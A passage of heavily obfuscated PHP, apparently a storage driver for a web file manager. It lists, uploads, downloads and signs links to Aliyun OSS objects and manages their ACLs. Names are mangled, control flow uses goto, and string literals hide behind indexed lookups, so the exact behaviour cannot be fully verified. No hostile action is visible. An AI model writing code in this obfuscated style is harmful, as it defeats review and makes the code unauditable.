0); } goto fÛ»ÅĞ÷ãè; Fä½ÌÛ¤ø: return $DŸ ÆÏ†Ã; goto BêÄ¨ƒøŸ; BêÄ¨ƒøŸ: } private function folderInfo($aàğĞºïÀå, $fà³×ß‡¸Ê = array()) { $d´¯åËÂÜİ =& $_SERVER[Ö¹ñÒÁ²÷]; $då¥ßáºïî = array($d´¯åËÂÜİ[28] => $this->pathThis($aàğĞºïÀå), $d´¯åËÂÜİ[75] => $this->getPathOuter($d´¯åËÂÜİ[8] . $aàğĞºïÀå), $d´¯åËÂÜİ[29] => $d´¯åËÂÜİ[76], $d´¯åËÂÜİ[183] => 0, $d´¯åËÂÜİ[106] => 0, $d´¯åËÂÜİ[184] => !0, $d´¯åËÂÜİ[185] => !0); if (empty($fà³×ß‡¸Ê)) { $aàğĞºïÀå = rtrim($aàğĞºïÀå, $d´¯åËÂÜİ[8]) . $d´¯åËÂÜİ[8]; $BÃ§Í¶ ñó = $this->objectMeta($aàğĞºïÀå); if (!$BÃ§Í¶ ñó) { return $då¥ßáºïî; } $fà³×ß‡¸Ê = array($d´¯åËÂÜİ[183] => $BÃ§Í¶ ñó[$d´¯åËÂÜİ[1178]][$d´¯åËÂÜİ[1179]], $d´¯åËÂÜİ[106] => strtotime($BÃ§Í¶ ñó[$d´¯åËÂÜİ[1176]])); } if (isset($fà³×ß‡¸Ê[$d´¯åËÂÜİ[106]])) { $då¥ßáºïî[$d´¯åËÂÜİ[106]] = $fà³×ß‡¸Ê[$d´¯åËÂÜİ[106]]; } if (isset($fà³×ß‡¸Ê[$d´¯åËÂÜİ[183]])) { $då¥ßáºïî[$d´¯åËÂÜİ[183]] = $fà³×ß‡¸Ê[$d´¯åËÂÜİ[183]]; } return $då¥ßáºïî; } public function listPath($C‰–ÚÜ˜Š, $f‡Š‰“½†ˆ = false) { $e„Î§³öî‡ =& $_SERVER[Ö¹ñÒÁ²÷]; $Bó‰†¼Ìé = $this->fileList($C‰–ÚÜ˜Š, $e„Î§³öî‡[8], !0); foreach ($Bó‰†¼Ìé[$e„Î§³öî‡[74]] as $DÄÈİŞ×„ => $FÜéÚ¹ Š) { $Bó‰†¼Ìé[$e„Î§³öî‡[74]][$DÄÈİŞ×„] = $this->folderInfo($FÜéÚ¹ Š, $FÜéÚ¹ Š); } foreach ($Bó‰†¼Ìé[$e„Î§³öî‡[73]] as $DÄÈİŞ×„ => $FÜéÚ¹ Š) { $Bó‰†¼Ìé[$e„Î§³öî‡[73]][$DÄÈİŞ×„] = $this->fileInfo($FÜéÚ¹ Š[$e„Î§³öî‡[28]], $FÜéÚ¹ Š); } return $Bó‰†¼Ìé; } public function has($c¡ÈğÑ¦Ğ³, $dÂÚŞ‹²Õê = false, $c¤‹Çñ¢ë¯ = true) { goto e‚Ã…½ˆ»ç; e™è†¨Ê¢‰: return !1; goto c¨¨„²²Ìø; e¦³©é—ğŒ: $a˜Şï¦àŞæ = $d£Ş’Ü‚¾[33]; $f”ª‘æ÷Ö = 500; $BßÛŠ÷øŠ = 0; goto eõÖš‡¸„»; e‚Ã…½ˆ»ç: $d£Ş’Ü‚¾ =& $_SERVER[Ö¹ñÒÁ²÷]; $c¡ÈğÑ¦Ğ³ = trim($c¡ÈğÑ¦Ğ³, $d£Ş’Ü‚¾[8]); $fˆİ¿âÍœ½ = empty($c¡ÈğÑ¦Ğ³) ? $d£Ş’Ü‚¾[33] : $c¡ÈğÑ¦Ğ³ . $d£Ş’Ü‚¾[8]; goto e¦³©é—ğŒ; eõÖš‡¸„»: $d«êÏí°· = 0; while (!0) { $DãÏùŸË‡İ = array($d£Ş’Ü‚¾[1167] => $d£Ş’Ü‚¾[8], $d£Ş’Ü‚¾[182] => $fˆİ¿âÍœ½, $d£Ş’Ü‚¾[1168] => $f”ª‘æ÷Ö, $d£Ş’Ü‚¾[1169] => $a˜Şï¦àŞæ); try { $Dé‰„» = $this->client->listObjects($this->bucket, $DãÏùŸË‡İ); } catch (OSS\Core\OssException $bÖÅÔ¶á‡) { break; } $a˜Şï¦àŞæ = $Dé‰„»->getNextMarker(); $C —–ÒÚš½ = $Dé‰„»->getObjectList(); $AË„äÙ¦Ÿ = $Dé‰„»->getPrefixList(); if ($dÂÚŞ‹²Õê) { if (count($C —–ÒÚš½) > 1 || count($C —–ÒÚš½) == 1 && $C —–ÒÚš½[0]->getKey() != $fˆİ¿âÍœ½) { $BßÛŠ÷øŠ += count($C —–ÒÚš½) - 1; } if (!empty($AË„äÙ¦Ÿ)) { $d«êÏí°· += count($AË„äÙ¦Ÿ); } if ($a˜Şï¦àŞæ === $d£Ş’Ü‚¾[33]) { break; } continue; } if ($c¤‹Çñ¢ë¯) { if (!empty($C —–ÒÚš½)) { if (count($C —–ÒÚš½) > 1 || $C —–ÒÚš½[0]->getKey() != $fˆİ¿âÍœ½) { return !0; } } } else { if (!empty($AË„äÙ¦Ÿ)) { return !0; } } if ($a˜Şï¦àŞæ === $d£Ş’Ü‚¾[33]) { break; } } if ($dÂÚŞ‹²Õê) { return array($d£Ş’Ü‚¾[187] => $BßÛŠ÷øŠ, $d£Ş’Ü‚¾[188] => $d«êÏí°·); } goto e™è†¨Ê¢‰; c¨¨„²²Ìø: } public function listAll($EêÃ±òß¶) { $A†»µ»ŒÖ =& $_SERVER[Ö¹ñÒÁ²÷]; $f¢Í˜»“¤ˆ = $this->fileList($EêÃ±òß¶, $A†»µ»ŒÖ[33], !0); $c©ÍñÅøã® = array(); foreach ($f¢Í˜»“¤ˆ[$A†»µ»ŒÖ[73]] as $DÔâö¥¿òë) { $c©ÍñÅøã®[$DÔâö¥¿òë[$A†»µ»ŒÖ[28]]] = $DÔâö¥¿òë[$A†»µ»ŒÖ[77]]; } return $this->listAllFiles($EêÃ±òß¶, array_keys($c©ÍñÅøã®), $c©ÍñÅøã®); } public function canRead($f›°¬¿ ¼) { $Càßô…êó‚ =& $_SERVER[Ö¹ñÒÁ²÷]; $e¯¤áÜÒ‘Ö = $this->pathAcl($f›°¬¿ ¼); return $e¯¤áÜÒ‘Ö == $Càßô…êó‚[1180] || $e¯¤áÜÒ‘Ö == $Càßô…êó‚[487] ? !0 : !1; } public function canWrite($DÆÁ¦ŠßÅ) { $BµÖ’í‹Ó = $this->pathAcl($DÆÁ¦ŠßÅ); return $BµÖ’í‹Ó == $_SERVER[Ö¹ñÒÁ²÷][487] ? !0 : !1; } public function pathAcl($BÑäÍ¢ç® ) { goto B·İ„ßù§ë; BŸÖáˆ«©·: return $eÒœãóæ¥; goto c‚ª¾ëî’Ô; DË‘¯Ÿë: $eÒœãóæ¥ = $Cçœîé == $b‡¦ÛÆßñÃ[34] ? $this->bucketAcl : $Cçœîé; if ($eÒœãóæ¥ == $b‡¦ÛÆßñÃ[1181]) { return $b‡¦ÛÆßñÃ[1180]; } if ($eÒœãóæ¥ == $b‡¦ÛÆßñÃ[1182]) { return $b‡¦ÛÆßñÃ[487]; } goto BŸÖáˆ«©·; B·İ„ßù§ë: $b‡¦ÛÆßñÃ =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Cçœîé = $this->client->getObjectAcl($this->bucket, $this->pathEncode($BÑäÍ¢ç® )); } catch (OSS\Core\OssException $D¹ïâ¥Ñî) { return !1; } goto DË‘¯Ÿë; c‚ª¾ëî’Ô: } private function chmodPath($aÇîÌİ®», $A·ª†ÊÜ—º = '') { $fË¸ÉÑ›ì =& $_SERVER[Ö¹ñÒÁ²÷]; $B¥’¸’»³ó = empty($A·ª†ÊÜ—º) ? $fË¸ÉÑ›ì[1182] : $A·ª†ÊÜ—º; $aÉ¸šÂª‘‹ = array($fË¸ÉÑ›ì[34], $fË¸ÉÑ›ì[181], $fË¸ÉÑ›ì[1181], $fË¸ÉÑ›ì[1182]); if (!in_array($B¥’¸’»³ó, $aÉ¸šÂª‘‹)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($aÇîÌİ®»), $B¥’¸’»³ó); } catch (OSS\Core\OssException $BÉš‰Äé‘) { return !1; } return !0; } public function getContent($AÊ£Ï„õ) { return $this->fileSubstr($AÊ£Ï„õ, -1); } public function setContent($Cˆù–Š¤×Ñ, $F——Ïôàìå = '') { $D©¼ÍÓ«éĞ =& $_SERVER[Ö¹ñÒÁ²÷]; try { $cµµ´ ñ‚¡ = $this->trafficLimit($D©¼ÍÓ«éĞ[1183]); $dÑ¤‰‰à• = $this->client->putObject($this->bucket, $this->pathEncode($Cˆù–Š¤×Ñ), $F——Ïôàìå, $cµµ´ ñ‚¡); } catch (OSS\Core\OssException $DõÅ«„Š†) { return !1; } $C¹÷—È·ØÓ = array($D©¼ÍÓ«éĞ[1170] => trim($dÑ¤‰‰à•[$D©¼ÍÓ«éĞ[1184]], $D©¼ÍÓ«éĞ[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Cˆù–Š¤×Ñ))); $this->updateObjMeta($Cˆù–Š¤×Ñ, $C¹÷—È·ØÓ); return isset($dÑ¤‰‰à•[$D©¼ÍÓ«éĞ[1185]][$D©¼ÍÓ«éĞ[1132]]) ? (int) $dÑ¤‰‰à•[$D©¼ÍÓ«éĞ[1185]][$D©¼ÍÓ«éĞ[1132]] : strlen($dÑ¤‰‰à•); } private function updateObjMeta($a·œà»’ÂÌ, $fˆ›Šè¹) { $a·œà»’ÂÌ = $this->pathEncode($a·œà»’ÂÌ); try { $A¥—ÇÆÓä = array(OSS\OssClient::OSS_HEADERS => $fˆ›Šè¹); $this->client->copyObject($this->bucket, $a·œà»’ÂÌ, $this->bucket, $a·œà»’ÂÌ, $A¥—ÇÆÓä); } catch (OSS\Core\OssException $e¢„¡ÀÙ‡Ÿ) { return !1; } return !0; } public function upload($eê Ü³¨Ñ, $D³¢í“Œ®, $e¯®¥×ÕÄ¡ = false, $bâ¦Ä«±ˆ¨ = REPEAT_REPLACE) { $BÍİĞÓµš =& $_SERVER[Ö¹ñÒÁ²÷]; $EÀƒ©íØç„ = trim($eê Ü³¨Ñ, $BÍİĞÓµš[8]); $EŞ»ª­È¼— = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($BÍİĞÓµš[1170] => @md5_file($D³¢í“Œ®)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eê Ü³¨Ñ))); $EŞ»ª­È¼— = $this->trafficLimit($BÍİĞÓµš[1183], $EŞ»ª­È¼—); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($EÀƒ©íØç„), $D³¢í“Œ®, $EŞ»ª­È¼—); } catch (OSS\Core\OssException $c«ãëÙÉöà) { return !1; } return $this->getPathOuter($eê Ü³¨Ñ); } public function getHost() { $d¶Šó¬âæŒ =& $_SERVER[Ö¹ñÒÁ²÷]; $c¢äâÙó©² = explode($d¶Šó¬âæŒ[167], parent::getHost()); return $c¢äâÙó©²[0] . $d¶Šó¬âæŒ[167] . $this->bucket . $d¶Šó¬âæŒ[91] . $c¢äâÙó©²[1]; } public function uploadFormData($d‘ËÎ‘œëÛ, $EÊº»ƒ–Ä„ = 3600) { goto eğà‹ˆù¦Ì; eŞËƒÍÅ·–: $bÃê¹²£ò¦ = $this->pathFather($d‘ËÎ‘œëÛ); $C÷”ØåÎ¹â = array($FäÜÔŠ¬°[1089] => $E“†Ò¼ß, $FäÜÔŠ¬°[1090] => array(array($FäÜÔŠ¬°[1188], 0, $F°÷Û¾¼Ë©), array($FäÜÔŠ¬°[1093], $FäÜÔŠ¬°[1094], $bÃê¹²£ò¦))); $Bóø‹’Òäø = base64_encode(json_encode($C÷”ØåÎ¹â)); goto ağï“İ§ŠÖ; E‚íø¥ä“: $a‰ƒÃÑ† = strpos($E“†Ò¼ß, $FäÜÔŠ¬°[280]); $E“†Ò¼ß = substr($E“†Ò¼ß, 0, $a‰ƒÃÑ†) . $FäÜÔŠ¬°[1187]; $F°÷Û¾¼Ë© = 1048576000 * 5; goto eŞËƒÍÅ·–; C›Óµ”íğÔ: return $A¤Ñà‹åÅÒ; goto fï¶Ú³ºÓÎ; eğà‹ˆù¦Ì: $FäÜÔŠ¬° =& $_SERVER[Ö¹ñÒÁ²÷]; if (!($a…Ì¿êÁÜÌ = $this->getHost())) { return !1; } $eêƒÃ°å©À = $EÊº»ƒ–Ä„; goto DèêŒÍ÷Ÿâ; DèêŒÍ÷Ÿâ: $Eí›‰½‚‘ã = date($FäÜÔŠ¬°[1186], time() + $eêƒÃ°å©À); $fË‘•Ë†ï… = new DateTime($Eí›‰½‚‘ã); $E“†Ò¼ß = $fË‘•Ë†ï…->format(DateTime::ISO8601); goto E‚íø¥ä“; ağï“İ§ŠÖ: $F¶œÍ¶¨šØ = base64_encode(hash_hmac($FäÜÔŠ¬°[214], $Bóø‹’Òäø, $this->secret, !0)); $A¤Ñà‹åÅÒ = array($FäÜÔŠ¬°[1099] => $Bóø‹’Òäø, $FäÜÔŠ¬°[1189] => $this->accessKey, $FäÜÔŠ¬°[1095] => $FäÜÔŠ¬°[1087], $FäÜÔŠ¬°[1190] => $F¶œÍ¶¨šØ, $FäÜÔŠ¬°[165] => $a…Ì¿êÁÜÌ); $A¤Ñà‹åÅÒ = $this->trafficLimit($FäÜÔŠ¬°[1183], $A¤Ñà‹åÅÒ); goto C›Óµ”íğÔ; fï¶Ú³ºÓÎ: } public function multiUploadFormData($bì²İË…Ì³, $c‹È×¶ùø« = 3600) { $Bù«Úé‰“ù =& $_SERVER[Ö¹ñÒÁ²÷]; if (!($aÙ—Î óÑë = $this->getHost())) { return !1; } $B‚Ô§ÍïÍ‡ = $this->trafficLimit($Bù«Úé‰“ù[1183]); $báÉ‡¤‹¼ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bì²İË…Ì³), $B‚Ô§ÍïÍ‡); return array($Bù«Úé‰“ù[205] => $báÉ‡¤‹¼, $Bù«Úé‰“ù[165] => $aÙ—Î óÑë . $Bù«Úé‰“ù[8] . $this->pathEncode($bì²İË…Ì³), $Bù«Úé‰“ù[206] => gmdate($Bù«Úé‰“ù[1191]), $Bù«Úé‰“ù[89] => $bì²İË…Ì³); } public function multiUploadAuthData($fˆóĞ»¼ì, $BŠÇ¾ìÑ„Œ = array()) { goto E’‚Œœ°µÛ; E’‚Œœ°µÛ: $fØñ˜ÁˆÃ =& $_SERVER[Ö¹ñÒÁ²÷]; $a¤Ÿáù–Æµ = isset($BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[206]]) ? $BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[206]] : gmdate($fØñ˜ÁˆÃ[1191]); $BÏ»‹†”Ã³ = isset($BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[156]]) ? $BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[156]] : $fØñ˜ÁˆÃ[33]; goto fíÍš½ãğø; D¥ÕßŞÙ: $dî–ƒ‡äÊš = $fØñ˜ÁˆÃ[1194] . $this->accessKey . $fØñ˜ÁˆÃ[4] . $d§ó¡äöË; if (strpos($BÏ»‹†”Ã³, $fØñ˜ÁˆÃ[209]) === 0) { $dî–ƒ‡äÊš = array($fØñ˜ÁˆÃ[216] => $dî–ƒ‡äÊš, $fØñ˜ÁˆÃ[206] => $a¤Ÿáù–Æµ); if ($c„ĞÔ‚ÓÁ¿) { $dî–ƒ‡äÊš = array_merge($dî–ƒ‡äÊš, $c„ĞÔ‚ÓÁ¿); } } return $dî–ƒ‡äÊš; goto cÇŞÌá¤›; d¼„“ĞÀ×: if (!empty($BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[1193]])) { $b”ÚÚì£Ä— = array_merge(array($aºŞ›Ø‘«Å[4]), $BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[1193]]); sort($b”ÚÚì£Ä—); $aºŞ›Ø‘«Å[4] = implode($fØñ˜ÁˆÃ[213], $b”ÚÚì£Ä—); } $E·ªµë = implode($fØñ˜ÁˆÃ[213], $aºŞ›Ø‘«Å); $d§ó¡äöË = base64_encode(hash_hmac($fØñ˜ÁˆÃ[214], $E·ªµë, $this->secret, !0)); goto D¥ÕßŞÙ; e¸–‰ñÆ: $aºŞ›Ø‘«Å = array($fØñ˜ÁˆÃ[208], $fØñ˜ÁˆÃ[33], $fØñ˜ÁˆÃ[115], $a¤Ÿáù–Æµ, "\x78\x2d\157\163\x73\x2d\x64\x61\164\x65\x3a{$a¤Ÿáù–Æµ}", $fØñ˜ÁˆÃ[8] . $this->bucket . $fØñ˜ÁˆÃ[8] . $d¼š¶êœœ . $BÏ»‹†”Ã³); if (strpos($BÏ»‹†”Ã³, $fØñ˜ÁˆÃ[209]) === 0) { $aºŞ›Ø‘«Å[0] = $fØñ˜ÁˆÃ[210]; if ($c„ĞÔ‚ÓÁ¿ = $this->trafficLimit($fØñ˜ÁˆÃ[1183])) { $d¼š¶êœœ = $fØñ˜ÁˆÃ[1192]; array_splice($aºŞ›Ø‘«Å, 5, 0, $d¼š¶êœœ . $fØñ˜ÁˆÃ[4] . $c„ĞÔ‚ÓÁ¿[$d¼š¶êœœ]); } } if (isset($BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[211]]) && $BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[211]] == $fØñ˜ÁˆÃ[212]) { $aºŞ›Ø‘«Å[0] = $fØñ˜ÁˆÃ[212]; } goto d¼„“ĞÀ×; fíÍš½ãğø: $d¼š¶êœœ = $fˆóĞ»¼ì; if (isset($BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[89]])) { $d¼š¶êœœ = $BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[89]]; unset($BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[89]]); } if (isset($BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[207]])) { $BŠÇ¾ìÑ„Œ[$fØñ˜ÁˆÃ[206]] = $a¤Ÿáù–Æµ; return $this->listUploadParts($d¼š¶êœœ, $BŠÇ¾ìÑ„Œ); } goto e¸–‰ñÆ; cÇŞÌá¤›: } public function listUploadParts($EÇ²ˆ²ùà, $bù®¸Ç—îš) { goto dÂĞù¢Ù; fóÆ‚‰¸: $AÖ‰°©Âº° = $cÒèºÒ’Ì->getListPart(); $dˆñÅõŒÇ‹ = array(); foreach ($AÖ‰°©Âº° as $bÊÜˆã…•·) { $dˆñÅõŒÇ‹[] = array($AëÜŠ¢ëùÄ[1174] => $bÊÜˆã…•·->getPartNumber(), $AëÜŠ¢ëùÄ[1175] => trim($bÊÜˆã…•·->getETag(), $AëÜŠ¢ëùÄ[112])); } goto eø¹°Ş´¯ˆ; eø¹°Ş´¯ˆ: unset($bù®¸Ç—îš[$AëÜŠ¢ëùÄ[207]], $bù®¸Ç—îš[$AëÜŠ¢ëùÄ[211]]); $f…¨ø²§È£ = $this->multiUploadAuthData($EÇ²ˆ²ùà, $bù®¸Ç—îš); if (empty($f…¨ø²§È£)) { return !1; } goto aËì¬¸½ÆÒ; aËì¬¸½ÆÒ: return array($AëÜŠ¢ëùÄ[216] => $f…¨ø²§È£, $AëÜŠ¢ëùÄ[206] => $bù®¸Ç—îš[$AëÜŠ¢ëùÄ[206]], $AëÜŠ¢ëùÄ[218] => $dˆñÅõŒÇ‹); goto EŒ£Ê£Ó¶£; dÂĞù¢Ù: $AëÜŠ¢ëùÄ =& $_SERVER[Ö¹ñÒÁ²÷]; $AªÔ´ÃñŸÎ = parse_url_query($bù®¸Ç—îš[$AëÜŠ¢ëùÄ[156]]); $cÒèºÒ’Ì = $this->client->listParts($this->bucket, $this->pathEncode($EÇ²ˆ²ùà), $AªÔ´ÃñŸÎ[$AëÜŠ¢ëùÄ[205]]); goto fóÆ‚‰¸; EŒ£Ê£Ó¶£: } public function download($Fö¦–¹¶ª›, $añ‹Ä‹š½) { if ($this->isFolder($Fö¦–¹¶ª›)) { return !1; } try { $FÌ„ ¡‹Ìá = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $añ‹Ä‹š½); $FÌ„ ¡‹Ìá = $this->trafficLimit($_SERVER[Ö¹ñÒÁ²÷][104], $FÌ„ ¡‹Ìá); $this->client->getObject($this->bucket, $this->pathEncode($Fö¦–¹¶ª›), $FÌ„ ¡‹Ìá); } catch (OSS\Core\OssException $eİáĞß­óğ) { return !1; } return $añ‹Ä‹š½; } public function fileSubstr($bÇî¿˜œ‡, $CÍÅË˜öá„ = 0, $D«ŒÎ´ŒÜ = false) { if ($CÍÅË˜öá„ === -1) { $CÆà˜ÄÎºÜ = array(); } else { if ($D«ŒÎ´ŒÜ === !1) { $dšŒ‡íõ¦ = $this->size($bÇî¿˜œ‡); } else { $dšŒ‡íõ¦ = $CÍÅË˜öá„ + $D«ŒÎ´ŒÜ - 1; } $CÆà˜ÄÎºÜ = array(OSS\OssClient::OSS_RANGE => "{$CÍÅË˜öá„}\x2d{$dšŒ‡íõ¦}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($bÇî¿˜œ‡), $CÆà˜ÄÎºÜ); } catch (OSS\Core\OssException $e…“¾©¿†) { think_exception($e…“¾©¿†->getMessage()); return !1; } } private function trafficLimit($AÁ½³äé²é, $a·áµÃ§ğì = array()) { goto Aõİ–‚Éç; cç²è¡Ç¹: if (!$Dëô»Èé±Š) { return $a·áµÃ§ğì; } $Dëô»Èé±Š = $Dëô»Èé±Š < 819200 ? 819200 : ($Dëô»Èé±Š > 838860800 ? 838860800 : $Dëô»Èé±Š); $a·áµÃ§ğì[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Dëô»Èé±Š); goto b¤‡ƒÕª¯; b¤‡ƒÕª¯: return $a·áµÃ§ğì; goto Eá–ŞêÔ¯æ; Aõİ–‚Éç: $bî®œÏÕ„’ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($AÁ½³äé²é == $bî®œÏÕ„’[1183] && $this->isUploadServer() || $AÁ½³äé²é == $bî®œÏÕ„’[104] && $this->isFileOutServer()) { return $a·áµÃ§ğì; } $Dëô»Èé±Š = floatval($GLOBALS[$bî®œÏÕ„’[6]][$bî®œÏÕ„’[84]][$bî®œÏÕ„’[102]][$AÁ½³äé²é]) * 1024 * 1024 * 8; goto cç²è¡Ç¹; Eá–ŞêÔ¯æ: } public function link($eêöÃÜâÛí, $Fùö®ŞºÏ = array()) { $c·©„¾ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->exist($eêöÃÜâÛí) || $this->isFolder($eêöÃÜâÛí)) { return !1; } try { $Fùö®ŞºÏ = $this->trafficLimit($c·©„¾[104], $Fùö®ŞºÏ); $A·ÃÄÀÉ‘ = $this->client->signUrl($this->bucket, $this->pathEncode($eêöÃÜâÛí), 3600 * 12, $c·©„¾[212], $Fùö®ŞºÏ); return $this->getCdnLink($A·ÃÄÀÉ‘); } catch (OSS\Core\OssException $DÉ˜ô›éºñ) { return !1; } } public function fileOut($EÊ§„óöˆ¥, $CìÜÈºÁº„ = false, $CÇ°ØÍˆñ = false, $D´÷ËŒ©¦´ = '') { goto EôŒÔˆÈªª; e–ã×©Œß”: $cÛÁÌ¸½†ï = array(OSS\OssClient::OSS_SUB_RESOURCE => $e›Û¶ƒ¦¶È[1195] . rawurlencode("{$CìÜÈºÁº„}\x3b\146\x69\154\x65\156\141\x6d\145\75{$CÇ°ØÍˆñ}")); $cÛÁÌ¸½†ï[OSS\OssClient::OSS_SUB_RESOURCE] .= $e›Û¶ƒ¦¶È[1196] . rawurlencode($e¡éîè‚Ç); $b°èÁ·Ë• = $this->link($EÊ§„óöˆ¥, $cÛÁÌ¸½†ï); goto d£«é‡©µŠ; bÅ›ÃòŠÏÚ: $e¡éîè‚Ç = get_file_mime(get_path_ext($CÇ°ØÍˆñ)); if ($e¡éîè‚Ç == $e›Û¶ƒ¦¶È[197]) { return parent::fileOut($EÊ§„óöˆ¥, $CìÜÈºÁº„, $CÇ°ØÍˆñ, $D´÷ËŒ©¦´); } $CìÜÈºÁº„ = $CìÜÈºÁº„ ? $e›Û¶ƒ¦¶È[198] : $e›Û¶ƒ¦¶È[199]; goto e–ã×©Œß”; d£«é‡©µŠ: $this->fileOutLink($b°èÁ·Ë•); goto c‰±½Ó†î; EôŒÔˆÈªª: $e›Û¶ƒ¦¶È =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$CÇ°ØÍˆñ) { $CÇ°ØÍˆñ = $this->pathThis($EÊ§„óöˆ¥); } $CÇ°ØÍˆñ = rawurlencode($CÇ°ØÍˆñ); goto bÅ›ÃòŠÏÚ; c‰±½Ó†î: } public function fileOutServer($c—Ëƒã¤, $aªŞ™èÒÛ = false, $f¶ÊÔšÜĞÀ = false, $f»ÁÅó«ôŞ = '') { parent::fileOut($c—Ëƒã¤, $aªŞ™èÒÛ, $f¶ÊÔšÜĞÀ, $f»ÁÅó«ôŞ); } public function fileOutImage($D½Œ®•ñ, $bÁ’†İ¾ˆ = 250) { $AŠ¨ÊÁ†‚ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ö¹ñÒÁ²÷][1197] . $bÁ’†İ¾ˆ); $DÖª½êŸˆ = $this->link($D½Œ®•ñ, $AŠ¨ÊÁ†‚); $this->fileOutLink($DÖª½êŸˆ); } public function fileOutImageServer($Eçœ§èÖ“‘, $BéÉ©Ô‰ïĞ = 250) { parent::fileOutImage($Eçœ§èÖ“‘, $BéÉ©Ô‰ïĞ); } public function fileOutLink($dõÄŸ‘‘») { $E¯â‡—•³ƒ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->isCdnHost() && substr($dõÄŸ‘‘», 0, 7) == $E¯â‡—•³ƒ[1102]) { $dõÄŸ‘‘» = $E¯â‡—•³ƒ[1103] . substr($dõÄŸ‘‘», 7); } header($E¯â‡—•³ƒ[152] . $dõÄŸ‘‘»); die; } public function hashMd5($EíÏòÁŒè, $d¾£„ãÕëŞ = '') { $f·³èÜÖÊ· =& $_SERVER[Ö¹ñÒÁ²÷]; $D‘Õìî¾¤ = $this->objectMeta($EíÏòÁŒè); if (!$D‘Õìî¾¤) { return $f·³èÜÖÊ·[33]; } if (!isset($D‘Õìî¾¤[$f·³èÜÖÊ·[1170]]) && !empty($d¾£„ãÕëŞ)) { $e¬œÀ‚Ü = $this->updateObjMeta($EíÏòÁŒè, array($f·³èÜÖÊ·[1170] => $d¾£„ãÕëŞ)); $D‘Õìî¾¤[$f·³èÜÖÊ·[1170]] = $e¬œÀ‚Ü ? $d¾£„ãÕëŞ : $f·³èÜÖÊ·[33]; } return isset($D‘Õìî¾¤[$f·³èÜÖÊ·[1170]]) ? strtolower($D‘Õìî¾¤[$f·³èÜÖÊ·[1170]]) : $f·³èÜÖÊ·[33]; } public function size($aß¥Â¹’) { $A­Ñ£ÛÁöñ = $this->objectMeta($aß¥Â¹’); return $A­Ñ£ÛÁöñ ? $A­Ñ£ÛÁöñ[$_SERVER[Ö¹ñÒÁ²÷][77]] : 0; } public function info($Cƒ±ìÏ£³â) { if ($this->isFolder($Cƒ±ìÏ£³â)) { return $this->folderInfo($Cƒ±ìÏ£³â); } else { if ($this->isFile($Cƒ±ìÏ£³â)) { return $this->fileInfo($Cƒ±ìÏ£³â); } } return !1; } public function exist($AÚ›±àò’Ä) { return $this->isFile($AÚ›±àò’Ä) || $this->isFolder($AÚ›±àò’Ä); } public function isFile($bè¤İ½¸‹Û) { return !$this->isFolder($bè¤İ½¸‹Û) && $this->objectMeta($bè¤İ½¸‹Û); } public function isFolder($aî‰Ìñ·Œï) { return $this->cacheMethod($_SERVER[Ö¹ñÒÁ²÷][219], $aî‰Ìñ·Œï); } protected function objectMeta($f²Îµ¿„¢¬) { return $this->cacheMethod($_SERVER[Ö¹ñÒÁ²÷][220], $f²Îµ¿„¢¬); } protected function _objectMeta($A¼š©—êÑ) { $EØËáæëÏ« =& $_SERVER[Ö¹ñÒÁ²÷]; try { $e“âÈéçİœ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($A¼š©—êÑ)); } catch (OSS\Core\OssException $Fà³…òùáÊ) { $e“âÈéçİœ = !1; } if ($e“âÈéçİœ) { $e“âÈéçİœ[$EØËáæëÏ«[77]] = intval($e“âÈéçİœ[$EØËáæëÏ«[1177]]); } return $e“âÈéçİœ; } protected function _isFolder($Fõë¢¯Á‹ƒ) { $A‰Ï¡¼©ä =& $_SERVER[Ö¹ñÒÁ²÷]; if ($Fõë¢¯Á‹ƒ == $A‰Ï¡¼©ä[33] || $Fõë¢¯Á‹ƒ == $A‰Ï¡¼©ä[8]) { return !0; } $bò‰à§—ªĞ = array($A‰Ï¡¼©ä[1167] => $A‰Ï¡¼©ä[8], $A‰Ï¡¼©ä[182] => rtrim($Fõë¢¯Á‹ƒ, $A‰Ï¡¼©ä[8]) . $A‰Ï¡¼©ä[8], $A‰Ï¡¼©ä[1168] => 1, $A‰Ï¡¼©ä[1169] => $A‰Ï¡¼©ä[33]); $EµÚ«Â¶ëÏ = $this->client->listObjects($this->bucket, $bò‰à§—ªĞ); if ($EµÚ«Â¶ëÏ->getObjectList() || $EµÚ«Â¶ëÏ->getPrefixList()) { return !0; } return !1; } } goto cÄŠßèŸ¡Ì; fÕ’¨Ö¹Ô›: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\x6a\157\142\114\x69\x73\164"; public $field = array("\x6e\141\x6d\145", "\x64\x65\163\x63", "\163\x6f\162\x74"); const JOB_KEY = "\x73\145\154\x66\x4a\x6f\x62\114\x69\x73\x74"; public function listData($f‹‡„‘£¯ = false, $d„¢èÉ¬©î = "\x73\157\162\164", 